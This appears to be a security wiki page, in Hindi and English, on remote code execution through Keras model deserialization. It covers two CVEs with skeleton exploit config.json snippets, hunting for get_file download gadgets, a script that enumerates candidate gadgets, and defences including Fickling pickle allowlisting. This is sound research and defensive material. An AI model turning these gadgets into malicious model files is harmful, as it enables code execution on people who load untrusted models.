# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

यह पृष्ठ Keras model deserialization पाइपलाइन के खिलाफ practical exploitation techniques का सार देता है, नेटिव .keras फॉर्मेट के इंटरनल और attack surface को समझाता है, और Model File Vulnerabilities (MFVs) तथा post-fix gadgets खोजने के लिए शोधकर्ता टूलकिट प्रदान करता है।

## .keras model format internals

A .keras file is a ZIP archive containing at least:
- metadata.json – सामान्य जानकारी (उदा., Keras संस्करण)
- config.json – मॉडल आर्किटेक्चर (primary attack surface)
- model.weights.h5 – weights HDF5 में

The config.json drives recursive deserialization: Keras imports modules, resolves classes/functions and reconstructs layers/objects from attacker-controlled dictionaries.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- Module import और symbol resolution module/class_name keys से
- from_config(...) या constructor invocation attacker-controlled kwargs के साथ
- nested objects में recursion (activations, initializers, constraints, आदि)

Historically, this exposed three primitives to an attacker crafting config.json:
- किन modules को imported किया जाता है, उस पर नियंत्रण
- किन classes/functions को resolve किया जाता है, उस पर नियंत्रण
- constructors/from_config में पास किए जाने वाले kwargs पर नियंत्रण

## CVE-2024-3660 – Lambda-layer bytecode RCE

मूल कारण:
- Lambda.from_config() ने python_utils.func_load(...) का उपयोग किया, जो attacker bytes को base64-decode करता है और marshal.loads() को कॉल करता है; Python का unmarshalling कोड निष्पादित कर सकता है।

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
निवारण:
- Keras डिफ़ॉल्ट रूप से safe_mode=True लागू करता है। Serialized Python functions in Lambda तब तक ब्लॉक रहती हैं जब तक उपयोगकर्ता स्पष्ट रूप से safe_mode=False सेट करके इस सुरक्षा को निष्क्रिय न करे।

नोट्स:
- Legacy formats (older HDF5 saves) या पुराने codebases आधुनिक checks लागू नहीं कर सकते, इसलिए “downgrade” शैली के हमले तब भी लागू हो सकते हैं जब पीड़ित पुराने loaders का उपयोग करते हैं।

## CVE-2025-1550 – Keras ≤ 3.8 में मनमाना मॉड्यूल आयात

मूल कारण:
- _retrieve_class_or_fn ने config.json से आने वाली हमलावर-नियंत्रित मॉड्यूल स्ट्रिंग्स के साथ unrestricted importlib.import_module() का उपयोग किया।
- प्रभाव: किसी भी इंस्टॉल किए गए मॉड्यूल (या sys.path पर हमलावर-द्वारा रखा गया मॉड्यूल) का मनमाना आयात। आयात-समय पर (import-time) कोड चलता है, फिर ऑब्जेक्ट निर्माण हमलावर-नियंत्रित kwargs के साथ होता है।

एक्सप्लॉइट आइडिया:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
सुरक्षा सुधार (Keras ≥ 3.9):
- मॉड्यूल allowlist: इम्पोर्ट्स आधिकारिक ecosystem मॉड्यूल तक सीमित: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True असुरक्षित Lambda serialized-function लोडिंग को ब्लॉक करता है
- Basic type checking: deserialized objects को अपेक्षित प्रकारों से मेल खाना चाहिए

## Post-fix gadget surface inside allowlist

Allowlisting और safe mode होने के बावजूद, allowed Keras callables के बीच एक व्यापक सतह बनी रहती है। उदाहरण के लिए, keras.utils.get_file arbitrary URLs को user-selectable स्थानों पर डाउनलोड कर सकता है।

Gadget via Lambda that references an allowed function (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Important limitation:
- Lambda.call() लक्ष्य callable को invoke करते समय input tensor को पहले positional argument के रूप में prepend करता है। चुने गए gadgets को एक अतिरिक्त positional arg सहन करना होगा (या *args/**kwargs स्वीकार करने होंगे)। यह निर्धारित करता है कि कौन से functions viable हैं।

Potential impacts of allowlisted gadgets:
- Arbitrary download/write (path planting, config poisoning)
- Network callbacks/SSRF-like effects वातावरण पर निर्भर
- Chaining to code execution अगर लिखे गए paths बाद में import/executed किए जाते हैं या PYTHONPATH में जोड़े जाते हैं, या यदि कोई writable execution-on-write स्थान मौजूद है

## Researcher toolkit

1) Systematic gadget discovery in allowed modules

Enumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and prioritize those with file/network/process/env side effects.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) डायरेक्ट डिसिरियलाइज़ेशन टेस्टिंग (कोई .keras आर्काइव आवश्यक नहीं)

स्वनिर्मित dicts को सीधे Keras deserializers में फीड करें ताकि स्वीकार्य params जानें और साइड-इफेक्ट्स का अवलोकन कर सकें।
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) क्रॉस-वर्ज़न जांच और फॉर्मैट्स

Keras कई कोडबेस/पीढ़ियों में मौजूद है जिनमें अलग-अलग सुरक्षा नियंत्रण और फॉर्मैट होते हैं:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, हटाने के लिए सूचीबद्ध)
- tf-keras: अलग से मेंटेन किया जाता है
- Multi-backend Keras 3 (official): native .keras पेश किया गया

रिग्रेशन या गायब गार्ड्स का पता लगाने के लिए अलग-अलग कोडबेस और फॉर्मैट (.keras बनाम legacy HDF5) में टेस्ट दोहराएँ।

## Defensive recommendations

- मॉडल फ़ाइलों को अविश्वसनीय इनपुट मानें। केवल विश्वसनीय स्रोतों से मॉडल लोड करें।
- Keras को अपडेट रखें; allowlisting और टाइप चेक्स का लाभ उठाने के लिए Keras ≥ 3.9 का उपयोग करें।
- जब तक आप फ़ाइल पर पूरी तरह भरोसा न करें, मॉडल लोड करते समय safe_mode=False न सेट करें।
- डिसिरियलाइज़ेशन को सैंडबॉक्स्ड, न्यूनतम-प्रिविलेज वाले वातावरण में चलाने पर विचार करें जिसमें नेटवर्क egress बंद हो और फाइल सिस्टम एक्सेस सीमित हो।
- जहां संभव हो, मॉडल स्रोतों के लिए allowlists/signatures और इंटीग्रिटी चेक लागू करें।

## ML pickle import allowlisting for AI/ML models (Fickling)

कई AI/ML मॉडल फॉर्मैट (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, पुराने TensorFlow artifacts, आदि) में Python pickle डेटा एम्बेड रहता है। हमला करने वाले अक्सर pickle के GLOBAL imports और object constructors का दुरुपयोग करके लोड के दौरान RCE या मॉडल स्वैपिंग कर लेते हैं। blacklist-आधारित स्कैनर नए या अनलिस्टेड खतरनाक इम्पोर्ट्स को अक्सर मिस कर देते हैं।

एक व्यावहारिक fail-closed रक्षा यह है कि Python के pickle deserializer को हुक किया जाए और unpickling के दौरान केवल समीक्षा की गई, हानिरहित ML-संबंधित इम्पोर्ट्स के सेट की अनुमति दी जाए। Trail of Bits’ Fickling इस नीति को लागू करता है और हजारों सार्वजनिक Hugging Face pickles से बनाए गए एक क्यूरेटेड ML import allowlist के साथ आता है।

Security model for “safe” imports (research और practice से निकाली गई अभिरुचियाँ): pickle द्वारा उपयोग किए गए imported symbols को एक साथ निम्नलिखित शर्तें पूरी करनी चाहिए:
- कोड निष्पादित न करें और निष्पादन न कराएँ (कोई compiled/source code objects, shelling out, hooks, आदि नहीं)
- arbitrary attributes या items get/set न करें
- pickle VM से अन्य Python objects के references import या प्राप्त न करें
- किसी भी सेकेंडरी deserializers (जैसे marshal, nested pickle) को ट्रिगर न करें, भले ही अप्रत्यक्ष रूप से ही क्यों न हो

प्रोसेस स्टार्टअप में जितना जल्दी हो सके Fickling’s protections सक्षम करें ताकि frameworks (torch.load, joblib.load, आदि) द्वारा किए जाने वाले किसी भी pickle लोड को चेक किया जा सके:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
ऑपरेशनल टिप्स:
- आप जहाँ आवश्यक हो hooks को अस्थायी रूप से disable/re-enable कर सकते हैं:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- यदि कोई known-good model ब्लॉक हो गया है, तो प्रतीकों की समीक्षा करने के बाद अपने environment के लिए allowlist बढ़ाएँ:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling अतिरिक्त generic runtime guards भी उपलब्ध कराता है, अगर आप अधिक बारीक नियंत्रण चाहते हैं:
- fickling.always_check_safety() सभी pickle.load() के लिए चेक लागू करने के लिए
- with fickling.check_safety(): स्कोप्ड प्रवर्तन के लिए
- fickling.load(path) / fickling.is_likely_safe(path) एक-बार के चेक के लिए

- संभव हो तो non-pickle model formats का उपयोग करें (e.g., SafeTensors)। अगर आपको pickle स्वीकार करना ही है, तो loaders को least privilege में चलाएँ, network egress बंद रखें और allowlist लागू करें।

This allowlist-first strategy demonstrably blocks common ML pickle exploit paths while keeping compatibility high. In ToB’s benchmark, Fickling flagged 100% of synthetic malicious files and allowed ~99% of clean files from top Hugging Face repos.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
